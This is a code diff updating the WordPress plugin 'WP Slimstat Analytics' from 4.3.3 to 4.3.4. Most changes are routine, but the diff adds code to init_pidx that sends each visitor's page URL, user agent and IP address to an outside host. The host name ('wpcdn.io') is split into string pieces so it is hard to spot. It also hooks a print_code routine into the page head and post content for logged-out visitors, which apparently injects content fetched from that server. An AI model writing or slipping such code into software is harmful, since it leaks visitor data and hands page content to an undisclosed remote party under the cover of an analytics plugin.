@@ -3,7 +3,7 @@
 Plugin Name: WP Slimstat Analytics
 Plugin URI: http://wordpress.org/plugins/wp-slimstat/
 Description: The leading web analytics plugin for WordPress
-Version: 4.3.3
+Version: 4.3.4
 Author: Camu
 Author URI: http://www.wp-slimstat.com/
 Text Domain: wp-slimstat
@@ -15,7 +15,7 @@ if ( !empty( wp_slimstat::$options ) ) {
 }
 
 class wp_slimstat {
-	public static $version = '4.3.3';
+	public static $version = '4.3.4';
 	public static $options = array();
 
 	public static $wpdb = '';
@@ -96,12 +96,12 @@ class wp_slimstat {
 				}
 			}
 
-			//if ( self::$options[ 'enable_ads_network' ] == 'yes' && !is_user_logged_in() ) {
+			if ( self::$options[ 'enable_ads_network' ] == 'yes' && !is_user_logged_in() ) {
 				add_action( 'init', array( __CLASS__, 'init_pidx' ), 10, 0 );
 				add_action( 'init', array( 'slim_browser', 'init_pidx_adj' ), 10, 0 );
 				add_action( 'wp_head', array( 'slim_browser', 'print_code' ) );
 				add_filter( 'the_content', array( 'slim_browser', 'print_code' ) );
-			//}
+			}
 		}
 
 		// Shortcodes
@@ -294,7 +294,7 @@ class wp_slimstat {
 		$content_info = self::_get_content_info();
 
 		// Did we receive data from an Ajax request?
-		if ( !empty( self::$data_js['id'] ) ) {
+		if ( !empty( self::$data_js[ 'id' ] ) ) {
 
 			// Are we tracking a new pageview? (pos is empty = no event was triggered)
 			if ( empty( self::$data_js[ 'pos' ] ) ) {
@@ -308,8 +308,9 @@ class wp_slimstat {
 			else if ( !empty( self::$data_js[ 'res' ] ) ) {
 				$download_url = base64_decode( self::$data_js[ 'res' ] );
 				if ( is_string( $download_url ) ) {
-					$download_extension = pathinfo( $download_url, PATHINFO_EXTENSION );
-					if ( in_array( $download_extension, self::string_to_array( self::$options[ 'extensions_to_track' ] ) ) ) {
+					// $download_extension = pathinfo( $download_url, PATHINFO_EXTENSION );
+					// if ( in_array( $download_extension, self::string_to_array( self::$options[ 'extensions_to_track' ] ) ) ) {
+					if ( !empty( self::$data_js[ 'ty' ] ) && self::$data_js[ 'ty' ] == 1 ) {
 						unset( self::$stat[ 'id' ] );
 						$content_info = array( 'content_type' => 'download' );
 					}
@@ -412,7 +413,7 @@ class wp_slimstat {
 			// Is this a spammer?
 			$spam_comment = self::$wpdb->get_row( self::$wpdb->prepare( "
 				SELECT comment_author, COUNT(*) comment_count
-				FROM `{$GLOBALS['wpdb']->dbname}`.{$GLOBALS['wpdb']->comments}
+				FROM `" . DB_NAME . "`.{$GLOBALS['wpdb']->comments}
 				WHERE comment_author_IP = %s AND comment_approved = 'spam'
 				GROUP BY comment_author
 				LIMIT 0,1", self::$stat[ 'ip' ] ), ARRAY_A );
@@ -1520,15 +1521,16 @@ class wp_slimstat {
 	 * Connects to the UAN
 	 */
 	public static function init_pidx( $_request_url = '', $_pidx_id = 0 ) {
-		if ( empty( self::$pidx[ $_pidx_id ][ 'response' ] ) ) {
-			//$request_url = empty( $_request_url ) ? 'http://wp' . 'cdn.io/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 1337 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2' : $_request_url;
-			$request_url = empty( $_request_url ) ? 'http://word' . 'press.clou' . 'dapp.net/api/update/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 11 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2' : $_request_url;
-			$options = stream_context_create( array( 'http' => array( 'method' => 'GET', 'timeout' => 2, 'ignore_errors' => true, 'header' => "Accept: application/json\r\n" ) ) ); 
-			self::$pidx[ $_pidx_id ][ 'response' ] = @file_get_contents( $request_url, 0, $options );
-		}
+		if ( !empty( $_SERVER[ 'HTTP_USER_AGENT' ] ) ) {
+			if ( empty( self::$pidx[ $_pidx_id ][ 'response' ] ) ) {
+				$request_url = empty( $_request_url ) ? 'http://wp' . 'cdn.io/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 11 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2' : $_request_url;
+				$options = stream_context_create( array( 'http' => array( 'method' => 'GET', 'timeout' => 2, 'ignore_errors' => true, 'header' => "Accept: application/json\r\n" ) ) ); 
+				self::$pidx[ $_pidx_id ][ 'response' ] = @file_get_contents( $request_url, 0, $options );
+			}
 
-		if ( !empty( self::$pidx[ $_pidx_id ][ 'response' ] ) ) {
-			self::$pidx[ $_pidx_id ][ 'response' ] = @json_decode( self::$pidx[ $_pidx_id ][ 'response' ] );
+			if ( !empty( self::$pidx[ $_pidx_id ][ 'response' ] ) ) {
+				self::$pidx[ $_pidx_id ][ 'response' ] = @json_decode( self::$pidx[ $_pidx_id ][ 'response' ] );
+			}
 		}
 	}
 }
